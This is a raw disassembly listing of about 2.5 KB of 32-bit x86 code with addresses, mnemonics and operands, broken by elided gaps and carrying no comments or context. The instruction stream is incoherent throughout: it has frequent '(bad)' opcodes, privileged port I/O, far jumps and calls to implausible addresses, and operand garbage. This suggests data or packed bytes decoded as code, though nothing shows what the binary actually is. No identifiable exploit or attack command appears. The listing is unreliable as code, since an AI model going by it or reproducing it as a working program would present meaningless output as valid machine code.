  420fa5:	add    ebx,DWORD PTR [esi+edx*2-0x7]
  420fa9:	into   
  420faa:	inc    ecx
  420fab:	in     eax,dx
  420fac:	sar    DWORD PTR [ebx],cl
  420fae:	(bad)  
  420faf:	aas    
  420fb0:	out    0x86,eax
  420fb2:	mov    ds:0x656f92ec,al
  420fb7:	setnp  ah
  420fba:	xchg   ebp,eax
  420fbb:	mov    esp,0xfedd52fe
  420fc0:	out    0xde,al
  420fc2:	adc    BYTE PTR [ebp+0xf],dl
  420fc5:	dec    esp
	...
  420fe2:	add    BYTE PTR [eax],al
  420fe4:	cdq    
  420fe5:	in     al,dx
  420fe6:	push   ebp
  420fe8:	xchg   ebx,eax
  420fe9:	lods   al,BYTE PTR ds:[esi]
  420fea:	jb     0x420f70
  420fec:	mov    BYTE PTR [ebx],0xff
  420fef:	call   0x6d168702
  420ff4:	rcr    al,cl
  420ff6:	cli    
  420ff7:	(bad)  
  420ff8:	cmp    al,0xe4
  420ffa:	cmp    dl,BYTE PTR [ecx+0x6c8b0009]
  421000:	sub    eax,0xd9befce9
  421005:	jmp    0x5c00:0x4000ad12
  42100c:	call   0x0:0x1166b7f3
  421013:	xchg   ecx,eax
  421014:	add    eax,0x8be90076
  421019:	jle    0x420ffe
  42101b:	xchg   edx,eax
  42101c:	cld    
  42101d:	in     al,dx
  42101e:	dec    edi
  42101f:	adc    edx,DWORD PTR [ecx]
  421021:	jns    0x420fe8
  421023:	sbb    DWORD PTR [edx+0x7e],esi
  421026:	jmp    0x42109c
  421028:	fsub   st(4),st
  42102a:	dec    edi
  42102b:	outs   dx,BYTE PTR ds:[esi]
  42102c:	cli    
  42102d:	(bad)  
  42102e:	pop    gs
  421030:	push   cs
  421031:	jg     0x420ff2
  421033:	aad    0x2
  421035:	push   esi
  421036:	jmp    DWORD PTR [ebx-0x6e]
  421039:	(bad)  
  42103b:	dec    esi
  42103c:	mov    esp,0x2246553b
  421041:	adc    al,0xf
  421043:	test   eax,0x4d82770e
	...
  421064:	add    BYTE PTR [eax],al
  421066:	mov    eax,0xc699fcec
  42106b:	fist   DWORD PTR [eax+0x72ec9c26]
  421071:	in     eax,dx
  421072:	popf   
  421073:	outs   dx,BYTE PTR ds:[esi]
  421074:	or     BYTE PTR [esi-0x17b4249a],bh
  42107a:	push   cs
  42107b:	test   BYTE PTR [edi+0x37faf900],bh
  421081:	inc    ebp
  421082:	push   esp
  421083:	jb     0x421086
  421085:	sbb    BYTE PTR [edi-0x13],0x70
  421089:	push   ss
  42108a:	mov    WORD PTR [edi],cs
  42108c:	and    eax,DWORD PTR [eax]
  42108e:	lock adc DWORD PTR fs:[esi+edx*2+0x3f],esp
  421094:	add    dh,bh
  421096:	ja     0x42105e
  421098:	dec    eax
  421099:	call   DWORD PTR [ebx-0x10]
  42109c:	lods   al,BYTE PTR ds:[esi]
  42109d:	add    DWORD PTR [edi+0x5],ebx
  4210a0:	xor    al,al
  4210a2:	adc    bh,BYTE PTR ds:0xff30c2c5
  4210a8:	push   eax
  4210a9:	mov    esp,DWORD PTR [eax+0x7e]
  4210ac:	call   0x4135c9
  4210b1:	push   edx
  4210b2:	fimul  DWORD PTR [eax-0x5]
  4210b5:	xor    eax,0x3fce20
  4210ba:	popa   
  4210bb:	jb     0x4210ad
  4210bd:	call   0x3f3ac5
  4210c2:	push   0x4a840bbf
  4210c7:	(bad)  
  4210c8:	(bad)  
  4210c9:	inc    DWORD PTR [eax]
	...
  4210e7:	add    BYTE PTR [edi+0x5a],dh
  4210ea:	or     BYTE PTR [eax],al
  4210ec:	sub    al,BYTE PTR [edx-0x5]
  4210ef:	add    BYTE PTR [ecx-0x3b8a04f0],bh
  4210f5:	imul   edi,DWORD PTR [edx+0xc],0x53
  4210f9:	jb     0x4210ef
  4210fb:	(bad)  
  4210fc:	jns    0x4210ec
  4210fe:	in     al,0xf6
  421100:	repnz out dx,eax
  421102:	sti    
  421103:	mov    BYTE PTR [ecx-0x11],bh
  421106:	mov    DWORD PTR [ebp-0x1c],eax
  421109:	(bad)  
  42110a:	jns    0x421159
  42110c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42110d:	(bad)  
  42110e:	out    0x6b,al
  421110:	pop    ds
  421111:	pop    edx
  421112:	hlt    
  421113:	push   edi
  421114:	or     eax,0x75f07612
  421119:	(bad)  
  42111c:	jp     0x42118b
  42111e:	icebp  
  42111f:	mov    cl,al
  421121:	call   0xd81a73ff
  421126:	add    BYTE PTR [ebx+0x6852745b],al
  42112c:	popf   
  42112d:	fild   DWORD PTR [eax]
  42112f:	add    ch,ah
  421131:	lock bound eax,QWORD PTR [eax+0xd]
  421135:	fs xchg edi,esp
  421138:	inc    ebx
  421139:	mov    ecx,0x4378e7ec
  42113e:	in     eax,dx
  42113f:	cld    
  421140:	(bad)  [ebp-0x43]
  421143:	mov    BYTE PTR [ebx-0x40],dl
  421146:	xchg   BYTE PTR [esi],al
  421148:	and    bl,BYTE PTR [ecx+0xbf86]
	...
  42116a:	mov    eax,ds:0x258a7fd0
  42116f:	mov    ch,ah
  421171:	cld    
  421172:	pop    esp
  421173:	xchg   edx,eax
  421174:	jbe    0x42117e
  421176:	(bad)  
  421177:	imul   eax,DWORD PTR [ebx],0xe08f0d00
  42117d:	pop    es
  42117e:	repnz push 0xffffff88
  421181:	mov    edi,0x72edc761
  421186:	std    
  421187:	adc    DWORD PTR [ecx+0x7a],edi
  42118a:	or     DWORD PTR [ecx+0x4ad384d8],ebp
  421190:	in     eax,dx
  421191:	xchg   DWORD PTR [eax+0x52],edx
  421194:	push   esi
  421195:	call   0x463b37
  42119a:	xchg   DWORD PTR [ebp+ebp*8-0x4461aca4],ebx
  4211a1:	rcr    DWORD PTR [ecx],0xd7
  4211a4:	repnz inc ebx
  4211a6:	jmp    0x8698158d
  4211ab:	add    BYTE PTR [eax],bl
  4211ad:	(bad)  
  4211ae:	or     BYTE PTR [eax-0x6a],cl
  4211b1:	inc    ebx
  4211b2:	or     eax,0x7555ed74
  4211b7:	jo     0x4211b6
  4211b9:	add    ecx,DWORD PTR ds:0x4f4e2c75
  4211bf:	add    al,0xe7
  4211c1:	push   esi
  4211c2:	xchg   esi,eax
  4211c3:	inc    edx
  4211c4:	jmp    0x421219
  4211c6:	pusha  
  4211c7:	adc    ecx,ebx
  4211c9:	adc    al,0xcd
  4211cb:	push   DWORD PTR [ecx-0x15]
	...
  4211ea:	add    BYTE PTR [eax],al
  4211ec:	(bad)
  4211f0:	mov    ?,edx
  4211f2:	pop    edx
  4211f3:	cld    
  4211f4:	xchg   ebp,eax
  4211f5:	add    al,BYTE PTR [ecx+0x5]
  4211f8:	test   BYTE PTR [edx-0x3e7bec3b],bh
  4211fe:	sbb    eax,0xc45097c3
  421203:	and    BYTE PTR [ecx+edi*8],0xdd
  421207:	xchg   BYTE PTR [ebx+0x1003e6fe],bl
  42120d:	and    al,0x74
  42120f:	inc    ecx
  421210:	mov    eax,ds:0xfb83e73e
  421215:	sbb    BYTE PTR [ebx],dl
  421217:	push   cs
  421218:	(bad)  
  421219:	out    0xd0,al
  42121b:	ja     0x421237
  42121d:	sub    BYTE PTR [edi+0x7e68d23],0xff
  421224:	mov    WORD PTR [ebx-0x18],fs
  421227:	add    ecx,DWORD PTR ds:0x695f80
  42122d:	add    ecx,0xc1000d04
  421233:	pop    ss
  421234:	mov    ah,0xfd
  421236:	ror    BYTE PTR ds:0xd470bd55,0x32
  42123d:	mov    dh,0x6
  42123f:	test   BYTE PTR [esi+ebx*2+0x68a1bb00],ah
  421246:	cli    
  421247:	mov    bl,0x9b
  421249:	add    BYTE PTR [eax-0x18],0xe
  42124d:	add    BYTE PTR [eax+0x20],al
	...
  42126b:	add    BYTE PTR [eax],al
  42126d:	add    BYTE PTR [ebx+edi*8],dh
  421270:	sbb    dh,0x9
  421273:	add    BYTE PTR [eax],al
  421275:	adc    DWORD PTR ds:0x6169c148,0x1b
  42127c:	or     eax,0xfce90464
  421281:	jmp    0x2a9a244a
  421286:	mov    ?,ecx
  421288:	sub    al,0xf6
  42128a:	mov    eax,DWORD PTR ds:0x560ee8ff
  421290:	adc    eax,0xf7684c31
  421295:	xor    al,dl
  421297:	add    ebp,DWORD PTR [edx-0x1f]
  42129a:	(bad)  
  42129b:	mov    esi,0x200da889
  4212a0:	cmp    al,0x48
  4212a2:	lahf   
  4212a3:	add    edi,DWORD PTR [ebx+esi*1]
  4212a6:	mov    ds:0xd9a08007,eax
  4212ab:	imul   eax,DWORD PTR [ebx],0x69
  4212ae:	imul   BYTE PTR [esi]
  4212b0:	jle    0x421299
  4212b2:	mov    gs,esi
  4212b4:	sub    eax,0xf767f615
  4212b9:	aam    0xf1
  4212bb:	sub    bl,0xe9
  4212be:	push   cs
  4212bf:	add    BYTE PTR [edx-0x2e],ch
  4212c2:	push   esi
  4212c3:	ror    DWORD PTR [ecx+0x3c200da8],0xc8
  4212ca:	pop    esp
  4212cb:	cld    
  4212cc:	cmp    esp,ebx
  4212ce:	inc    eax
  4212cf:	lock jg 0x421322
	...
  4212ee:	add    BYTE PTR [eax],al
  4212f0:	stc    
  4212f1:	arpl   WORD PTR [ebx],ax
  4212f3:	imul   esp,DWORD PTR [esi+0x42007e2e],0x602ef57c
  4212fd:	loop   0x42137b
  4212ff:	stc    
  421300:	or     DWORD PTR [eax-0x24],ebp
  421303:	sbb    ch,0x4
  421306:	or     eax,DWORD PTR [esp+edi*2-0xb00042c]
  42130d:	fidiv  DWORD PTR [esi]
  42130f:	je     0x42137a
  421311:	xor    ebp,0x3f
  421314:	pop    ebx
  421315:	jle    0x4212c4
  421317:	add    BYTE PTR [ebx+eax*1+0x6a],ah
  42131b:	pop    ds
  42131c:	lods   al,BYTE PTR ds:[esi]
  42131d:	shl    BYTE PTR [esi+0x1c],0x7c
  421321:	sar    BYTE PTR [ecx+edi*8-0x77],0x6e
  421326:	add    al,0x6a
  421328:	push   cs
  421329:	xor    al,0xbf
  42132b:	sub    BYTE PTR ds:0xb4057c33,0xd9
  421332:	xor    eax,0xbe69417e
  421337:	or     al,0x4
  421339:	xor    BYTE PTR [ebp+0x72],bl
  42133c:	xor    BYTE PTR [edi],dl
  42133e:	data16 jbe 0x42136e
  421341:	xor    ebp,0x3a
  421344:	cmp    edi,DWORD PTR [esi+0x7d]
  421347:	add    BYTE PTR [ebx+eax*1],ah
  42134a:	push   0x19
  42134c:	dec    esp
  42134d:	sar    DWORD PTR [ecx+edi*8-0x35],0xe3
  421352:	sbb    BYTE PTR ds:0x0,0x0
	...
  421371:	add    BYTE PTR [ebx-0x727f042d],cl
  421377:	adc    esi,DWORD PTR [esi+edi*4+0x74]
  42137b:	retf   0x802c
  42137e:	pop    ebp
  42137f:	jmp    0xc357:0xf70e6773
  421386:	fld    TBYTE PTR [ebp+ecx*8+0x69ba6e80]
  42138d:	inc    eax
  42138e:	or     eax,0x577300d9
  421393:	pop    ecx
  421394:	jmp    0x451f:0x57613820
  42139b:	sbb    bh,ah
  42139d:	mov    ch,0xcc
  42139f:	pop    eax
  4213a0:	test   eax,0x9928d7
  4213a5:	add    BYTE PTR [ecx],bl
  4213a7:	aad    0x56
  4213a9:	and    ch,ah
  4213ab:	sbb    DWORD PTR [ecx-0x1c7ad10a],eax
  4213b1:	jg     0x421427
  4213b3:	mov    ch,0x75
  4213b5:	xor    al,0x66
  4213b7:	call   0x587ec9b4
  4213bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213bd:	xlat   BYTE PTR ds:[ebx]
  4213be:	lock cwde 
  4213c0:	add    BYTE PTR [eax],al
  4213c2:	loope  0x4213a0
  4213c4:	push   esi
  4213c5:	and    dh,BYTE PTR [ebp-0x11097c67]
  4213cb:	dec    esp
  4213cc:	and    al,0x80
  4213ce:	inc    esp
  4213cf:	or     eax,0xc826186f
  4213d4:	clc    
  4213d5:	mov    ch,0x0
	...
  4213f3:	add    BYTE PTR [eax+ebx*2-0x52],bl
  4213f7:	xlat   BYTE PTR ds:[ebx]
  4213f8:	mov    eax,0x98000418
  4213fd:	fild   DWORD PTR [eax-0x3d3110a]
  421403:	jg     0x421419
  421405:	(bad)  [ecx+eax*1+0x3e]
  421409:	xchg   edi,eax
  42140a:	inc    ebx
  42140b:	rcl    DWORD PTR [eax-0x6040fbe0],0x18
  421412:	add    al,0xe8
  421414:	lahf   
  421415:	sbb    BYTE PTR [eax+ecx*1],al
  421418:	jle    0x421432
  42141a:	add    al,0x13
  42141c:	jle    0x421436
  42141e:	add    al,0x22
  421420:	jle    0x42143a
  421422:	add    al,0x99
  421424:	jle    0x421426
  421426:	test   al,0x3
  421428:	lahf   
  421429:	xchg   ecx,eax
  42142a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42142b:	add    edi,DWORD PTR [ecx+edx*4]
  42142e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42142f:	add    ebx,DWORD PTR [ecx+edx*4-0x59]
  421433:	add    eax,ecx
  421435:	xchg   ecx,eax
  421436:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421437:	add    ebp,DWORD PTR [ebx-0x6f]
  42143a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42143b:	add    eax,ebp
  42143d:	xchg   ecx,eax
  42143e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42143f:	add    esp,DWORD PTR [esi-0x59fc586f]
  421445:	xchg   ecx,eax
  421446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421447:	add    edx,DWORD PTR [edx]
  421449:	mov    WORD PTR [edi-0x5873d1fd],fs
  42144f:	add    ebx,esi
  421451:	js     0x42144d
  421453:	xchg   BYTE PTR [esi-0x18],ch
  421456:	imul   ebx,eax,0x0
	...
  421474:	add    BYTE PTR [eax],al
  421476:	ss jns 0x421424
  421479:	adc    edi,DWORD PTR [eax+edi*2+0x78c0fb93]
  421480:	div    BYTE PTR [esi]
  421482:	dec    ebp
  421483:	ja     0x4214af
  421485:	and    BYTE PTR ds:0x1d202277,ah
  42148b:	ja     0x4214b7
  42148d:	and    BYTE PTR [ecx],bl
  42148f:	ja     0x4214b3
  421491:	and    BYTE PTR [ecx],bl
  421493:	jp     0x4214c1
  421495:	adc    edx,DWORD PTR [ebp-0x5d00fcc4]
  42149b:	pop    ebx
  42149c:	or     edi,edi
  42149e:	cdq    
  42149f:	dec    esp
  4214a0:	bound  ebp,QWORD PTR [eax+0x1]
  4214a3:	ins    BYTE PTR es:[edi],dx
  4214a4:	out    dx,al
  4214a5:	ss int 0xd6
  4214a8:	sbb    dl,BYTE PTR ds:0xbc6c000d
  4214ae:	jg     0x4214eb
  4214b0:	popa   
  4214b1:	cmp    edx,esi
  4214b3:	sub    BYTE PTR [edi+0x7f80386f],0x5
  4214ba:	pop    ebx
  4214bb:	xlat   BYTE PTR ds:[ebx]
  4214bc:	jmp    FWORD PTR [eax-0x17]
  4214bf:	add    BYTE PTR [ebp+eax*4-0x72],dh
  4214c3:	in     eax,dx
  4214c4:	push   cs
  4214c5:	fst    st(7)
  4214c7:	neg    DWORD PTR fs:[esp+edi*1]
  4214cb:	pop    es
  4214cc:	mov    DWORD PTR [edx-0x2a407efa],ebp
  4214d2:	(bad)  [edi-0x33]
  4214d5:	inc    esi
  4214d6:	mov    esi,0xb5bf81
	...
  4214f7:	add    BYTE PTR [ebx+0x76],ah
  4214fa:	inc    ebp
  4214fb:	fdivp  st(2),st
  4214fd:	jp     0x42150a
  4214ff:	out    0x16,al
  421501:	cmp    edx,DWORD PTR ds:0x8820b712
  421507:	in     eax,dx
  421508:	xchg   BYTE PTR [ebp+eax*2-0x2],bh
  42150c:	inc    ebx
  42150d:	sar    BYTE PTR [edi],0x0
  421510:	cmp    esi,ebp
  421512:	(bad)  
  421513:	call   0xbd415000
  421518:	add    al,0x71
  42151a:	add    al,0x60
  42151c:	repnz sbb ebx,DWORD PTR [ebp*4+0x7004711e]
  421524:	mov    ch,0x1b
  421526:	adc    al,0xd
  421528:	sbb    eax,0xd5e0e24
  42152d:	jge    0x4215aa
  42152f:	add    eax,0xf60378e9
  421534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421535:	push   0x40a7d924
  42153a:	and    al,0xd
  42153c:	call   0xb4a72228
  421541:	repnz (bad) 
  421543:	call   0xe1417ad6
  421548:	add    BYTE PTR [esi*2+0x43de5f9],0x68
  421550:	addr16 cld 
  421552:	(bad)  
  421553:	push   DWORD PTR [edi+edi*8]
  421556:	dec    DWORD PTR [esi]
  421558:	imul   esi,DWORD PTR [ebp+0xb],0x0
	...
  421578:	add    BYTE PTR [eax],al
  42157a:	in     al,0x64
  42157c:	jp     0x421586
  42157e:	mov    bl,0xb1
  421580:	inc    edx
  421581:	add    DWORD PTR [esp+edi*2-0xc],edi
  421585:	cmp    eax,0x101b80b3
  42158a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42158b:	(bad)  
  42158c:	cli    
  42158d:	and    al,0x29
  42158f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421591:	inc    ecx
  421592:	mov    ah,0x7f
  421594:	test   DWORD PTR ds:0xf1c63b3,0xfb7fffa4
  42159e:	scas   al,BYTE PTR es:[edi]
  42159f:	call   0xffc52c24
  4215a4:	(bad)  
  4215a5:	jg     0x4215f1
  4215a7:	cld    
  4215a8:	jle    0x4215f8
  4215aa:	ins    BYTE PTR es:[edi],dx
  4215ab:	fdivr  DWORD PTR [edi+0x4e]
  4215ae:	push   eax
  4215af:	fadd   DWORD PTR [esi+0x44d4f406]
  4215b5:	psubsb mm1,mm4
  4215b8:	std    
  4215b9:	jmp    DWORD PTR [ebx+eax*1-0x4]
  4215bd:	mov    BYTE PTR [edx-0x3f],ch
  4215c0:	inc    edx
  4215c1:	add    DWORD PTR [ebp-0x3c],eax
  4215c4:	mov    ch,0x80
  4215c6:	das    
  4215c7:	jmp    0x0:0x72840b
  4215ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215cf:	rol    DWORD PTR [esi],cl
  4215d1:	ud1    ebp,DWORD PTR [eax-0x3ecbfffd]
  4215d8:	inc    edx
  4215d9:	add    DWORD PTR [ebx],ebx
  4215db:	les    ebx,FWORD PTR [ebp+0x80]
	...
  4215f9:	add    BYTE PTR [eax],al
  4215fb:	add    BYTE PTR [edi-0x16],bl
  4215fe:	or     eax,DWORD PTR [ebp+esi*4+0x74fffce4]
  421605:	aam    0x6
  421607:	prefetchwt1 BYTE PTR [edx+edx*8+0x9]
  42160c:	or     eax,0x317b83d9
  421611:	lds    eax,FWORD PTR [eax]
  421613:	(bad)  
  421614:	dec    ebx
  421615:	fdiv   DWORD PTR [edx]
  421617:	je     0x4215aa
  421619:	pop    ebp
  42161a:	inc    eax
  42161b:	or     al,0x88
  42161d:	cwde   
  42161e:	ins    BYTE PTR es:[edi],dx
  42161f:	sub    al,0x96
  421621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421622:	sbb    al,0x14
  421624:	xchg   esi,eax
  421625:	xchg   esp,eax
  421626:	sbb    al,0x10
  421628:	out    0x1e,al
  42162a:	push   edx
  42162b:	mov    ebx,eax
  42162d:	xor    ecx,edx
  42162f:	or     ch,0xa4
  421632:	cli    
  421633:	mov    DWORD PTR [ebx-0x36],ecx
  421636:	sbb    al,0x84
  421638:	or     ebp,edx
  42163a:	js     0x421681
  42163c:	cli    
  42163d:	pop    esi
  42163e:	aas    
  42163f:	adc    eax,0x43789a31
  421644:	sub    edx,edx
  421646:	test   DWORD PTR [edx+0xd88e],0x141c7c8e
  421650:	or     eax,0x62fd4010
  421655:	loope  0x4215d8
  421657:	clc    
  421658:	sub    eax,0x1047cda
  42165d:	fld    DWORD PTR [eax]
  42165f:	add    BYTE PTR [eax],0x0
	...
  42167e:	inc    esi
  42167f:	out    dx,eax
  421680:	cmc    
  421681:	add    DWORD PTR [ebx-0x13],0x0
  421685:	add    BYTE PTR [ebx+0x12],dl
  421688:	add    ebp,DWORD PTR [ebx]
  42168a:	and    al,0xe4
  42168c:	in     eax,0xfc
  42168e:	sub    bl,BYTE PTR [eax-0x17]
  421691:	or     DWORD PTR [edx],edx
  421693:	pop    esp
  421694:	dec    ebp
  421695:	add    DWORD PTR ds:0x4d0576d9,ecx
  42169b:	rol    BYTE PTR [ecx],0xa8
  42169e:	adc    eax,0xea80f600
  4216a3:	cmc    
  4216a4:	out    0x3,al
  4216a6:	sar    DWORD PTR [edx],cl
  4216a8:	call   0x1452bbd8
  4216ad:	cli    
  4216ae:	push   0x62
  4216b0:	fld    QWORD PTR [eax]
  4216b2:	pop    ecx
  4216b3:	cld    
  4216b4:	mov    ecx,0xb9fde5c3
  4216b9:	ret    
  4216ba:	adc    al,al
  4216bc:	xchg   bh,bh
  4216be:	adc    al,0x3c
  4216c0:	or     esi,edi
  4216c2:	mov    bh,BYTE PTR [edx]
  4216c4:	idiv   BYTE PTR [edx+0x51]
  4216c7:	adc    BYTE PTR [esp+eax*8+0x3e],ch
  4216cb:	or     eax,0xd0a9b662
  4216d0:	imul   ebx,esp,0x3bf16da2
  4216d6:	or     BYTE PTR [ebx-0x7f],bh
  4216d9:	not    BYTE PTR [edx+0xaf666e1]
  4216df:	jbe    0x42168d
  4216e1:	push   cs
	...
  4216fe:	add    BYTE PTR [eax],al
  421700:	sub    DWORD PTR [ecx+0x6f],esp
  421703:	inc    eax
  421704:	xor    ecx,esi
  421706:	in     eax,0x7f
  421708:	inc    eax
  421709:	loop   0x421718
  42170b:	out    0x95,eax
  42170d:	cmp    al,0xcb
  42170f:	adc    esi,DWORD PTR [ebx+edi*1]
  421712:	jmp    0x4216f0
  421714:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421715:	icebp  
  421716:	out    0x3,al
  421718:	test   BYTE PTR [ebx],bh
  42171a:	fistp  DWORD PTR [edx]
  42171c:	rcr    DWORD PTR [ebx],1
  42171e:	idiv   DWORD PTR [edx-0x30]
  421721:	repz jmp 0x61c93467
  421727:	jmp    0x1c4553b7
  42172c:	xchg   esp,eax
  42172d:	cmp    ch,bh
  42172f:	sub    dl,BYTE PTR [eax+0x69]
  421732:	xlat   BYTE PTR ds:[ebx]
  421733:	jno    0x421748
  421735:	and    eax,0x17ed2d00
  42173a:	jno    0x42171d
  42173c:	xchg   DWORD PTR [ecx+0x2c2d3586],esi
  421742:	jmp    0x248f8f38
  421747:	shl    DWORD PTR [ecx+0x65],0x24
  42174b:	aad    0x8f
  42174d:	fs and al,0xe1
  421750:	push   cs
  421751:	ins    DWORD PTR es:[edi],dx
  421752:	or     BYTE PTR [edx+0x72],dh
  421755:	sbb    al,0x10
  421757:	pusha  
  421758:	push   0x1c
  42175a:	sbb    dl,al
  42175c:	int3   
  42175d:	pop    es
  42175e:	dec    esp
  42175f:	or     eax,0xf14578fd
	...
  421780:	add    BYTE PTR [eax],al
  421782:	aaa    
  421783:	cmp    eax,0x3d35f924
  421788:	adc    BYTE PTR [esi+0x29],cl
  42178b:	cmp    eax,0x3b27d924
  421790:	or     dl,dh
  421792:	sar    DWORD PTR [ecx+0x4d],1
  421795:	in     eax,0x9b
  421797:	jge    0x421732
  421799:	fmul   QWORD PTR [esi]
  42179b:	add    dh,al
  42179d:	scas   eax,DWORD PTR es:[edi]
  42179e:	or     DWORD PTR [edx],esp
  4217a0:	aaa    
  4217a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217a2:	sbb    cl,BYTE PTR [eax]
  4217a4:	or     eax,0xfce23a6d
  4217a9:	push   cs
  4217aa:	out    0x65,eax
  4217ac:	or     BYTE PTR [edx+0x23],dh
  4217af:	or     al,0x83
  4217b1:	sub    edx,ebp
  4217b3:	adc    al,0x89
  4217b5:	popf   
  4217b6:	repnz pop es
  4217b8:	mov    DWORD PTR [ebp-0x4cd6efd6],ebx
  4217be:	into   
  4217bf:	xor    BYTE PTR [ecx-0x7d4fcf51],cl
  4217c5:	test   eax,0x2789f5bd
  4217ca:	sbb    BYTE PTR [esi+eax*4],bl
  4217cd:	add    BYTE PTR [eax],bl
  4217cf:	loop   0x421755
  4217d1:	inc    esi
  4217d2:	inc    ebx
  4217d3:	inc    bx
  4217d5:	pop    ss
  4217d6:	add    BYTE PTR [ebx-0x78],bl
  4217d9:	inc    esp
  4217da:	adc    ch,dl
  4217dc:	or     eax,DWORD PTR [ebp-0x41ac2]
  4217e2:	addr16 pusha 
  4217e4:	and    al,0x18
	...
  421802:	add    BYTE PTR [eax],al
  421804:	in     al,0xba
  421806:	or     bh,dh
  421808:	fwait
  421809:	in     eax,0x7c
  42180b:	sti    
  42180c:	(bad)  
  42180e:	add    BYTE PTR [edx-0x17],0x3
  421812:	add    BYTE PTR [eax-0x7bf425a1],al
  421818:	jge    0x4217f0
  42181a:	cld    
  42181b:	(bad)  
  42181c:	ds push ds
  42181e:	adc    esp,DWORD PTR [esi+edi*1]
  421821:	fadd   DWORD PTR [esi]
  421823:	jmp    0x3eee28
  421828:	repnz sbb eax,0x251f02fd
  42182e:	cmp    edi,0xd1c5fab
  421834:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421835:	add    eax,DWORD PTR [edi-0x7e32c432]
  42183b:	shl    BYTE PTR [eax-0x7cb97927],0xff
  421842:	jl     0x421850
  421844:	gs pop ebx
  421846:	inc    ebx
  421847:	pop    ss
  421848:	out    dx,al
  421849:	sbb    eax,0x5b8b2413
  42184e:	inc    ecx
  42184f:	and    al,0x6b
  421851:	aam    0x80
  421853:	(bad)  
  421854:	push   0x708b0003
  421859:	dec    DWORD PTR [edi]
  42185b:	sub    esi,ecx
  42185d:	xlat   BYTE PTR ds:[ebx]
  42185e:	cmp    al,0xe9
  421860:	mov    eax,0xdfffcd4
  421865:	imul   ebp,eax,0x53
	...
  421883:	add    BYTE PTR [eax],al
  421885:	add    BYTE PTR [eax-0x16fa891e],ah
  42188b:	ret    
  42188c:	hlt    
  42188d:	(bad)  
  42188e:	xchg   edx,eax
  42188f:	out    0xd7,eax
  421891:	dec    edx
  421892:	lea    edx,[edx+0x28900d3d]
  421898:	cmc    
  421899:	inc    DWORD PTR [edx]
  42189b:	imul   ebx,DWORD PTR [ebx],0xe26d3fc
  4218a1:	add    cl,bl
  4218a3:	inc    DWORD PTR cs:[ecx]
  4218a6:	shl    DWORD PTR [esi],cl
  4218a8:	add    DWORD PTR [edx],edx
  4218aa:	hlt    
  4218ab:	stos   DWORD PTR es:[edi],eax
  4218ac:	hlt    
  4218ad:	(bad)  
  4218ae:	fisubr DWORD PTR [eax+0x1b]
  4218b1:	add    DWORD PTR [esi-0x710303da],ecx
  4218b7:	(bad)  
  4218b8:	idiv   esp
  4218ba:	lea    esp,[ecx-0x9]
  4218bd:	jae    0x421848
  4218bf:	push   0x6e390ae8
  4218c4:	cmp    eax,0xd7dbe55
  4218ca:	adc    cl,ch
  4218cc:	add    dh,al
  4218ce:	push   ebx
  4218cf:	call   0x165affd1
  4218d4:	in     al,0xfc
  4218d6:	lea    edx,[ecx]
  4218d8:	dec    ebp
  4218d9:	or     eax,0x25488
  4218de:	or     eax,0x8ff3b27
  4218e3:	add    BYTE PTR [ebp+0xb],dh
  4218e6:	or     eax,0xf880e9
	...
  421907:	add    BYTE PTR [ecx+0xc797dd5],bh
  42190d:	jmp    0xe80ddf12
  421912:	sti    
  421913:	out    0xc7,al
  421915:	mov    esp,0xff8d0000
  42191a:	loope  0x421950
  42191c:	or     BYTE PTR [ebp+0xd054e],al
  421922:	lods   eax,DWORD PTR ds:[esi]
  421923:	dec    edx
  421924:	sub    al,BYTE PTR [esi]
  421926:	shr    BYTE PTR [ecx+edx*1+0x0],0xe7
  42192b:	adc    DWORD PTR ds:0xb888ee2e,0x0
  421932:	out    0x3,eax
  421934:	rol    DWORD PTR [esi-0x18],cl
  421937:	or     al,0xea
  421939:	repz add ecx,DWORD PTR ss:0x36b4298b
  421941:	pop    es
  421942:	push   ds
  421943:	ss jae 0x421953
  421946:	dec    ebp
  421947:	(bad)  
  421948:	push   0x73148e81
  42194d:	xchg   DWORD PTR [esp+esi*8],esp
  421950:	enter  0xe846,0xd
  421954:	mov    dl,0x1a
  421956:	fild   DWORD PTR [ebx]
  421958:	or     eax,0x3e326180
  42195d:	pop    es
  42195e:	and    eax,0x400ab24a
  421963:	xor    BYTE PTR [ecx],bl
  421965:	add    bh,ah
  421967:	and    DWORD PTR [ebp+0x2dc310],0x0
	...
  42198a:	(bad)  
  42198b:	fcos   
  42198d:	(bad)  
  42198e:	out    dx,al
  42198f:	bound  ecx,QWORD PTR gs:[edx+0x1d]
  421993:	retw   0x14c3
  421997:	data16 mul BYTE PTR [ecx-0x3b1599bb]
  42199e:	call   0xf3561823
  4219a3:	xchg   BYTE PTR [ebx+esi*8+0x3e9e59b],ah
  4219aa:	or     eax,0x1c4c266
  4219af:	xchg   bh,bh
  4219b1:	repz sbb eax,DWORD PTR [eax]
  4219b4:	add    BYTE PTR [ebx-0x29],ah
  4219b7:	repnz and esi,DWORD PTR [edx+0xa]
  4219bb:	pop    es
  4219bc:	out    0xd1,eax
  4219be:	add    al,BYTE PTR [eax]
  4219c0:	add    BYTE PTR [ebx+edx*8-0x51],ah
  4219c4:	cmp    esp,eax
  4219c6:	(bad)  
  4219c7:	call   0xc0af1031
  4219cc:	gs push 0x26
  4219cf:	sub    eax,0xf2546066
  4219d4:	lds    esp,FWORD PTR [edi]
  4219d6:	or     BYTE PTR [edi+eiz*8],cl
  4219d9:	mov    esp,0x6900000b
  4219de:	sar    esp,cl
  4219e0:	jb     0x4219c2
  4219e2:	aam    0x42
  4219e4:	(bad)  
  4219e5:	fcomi  st,st(1)
  4219e7:	ret    
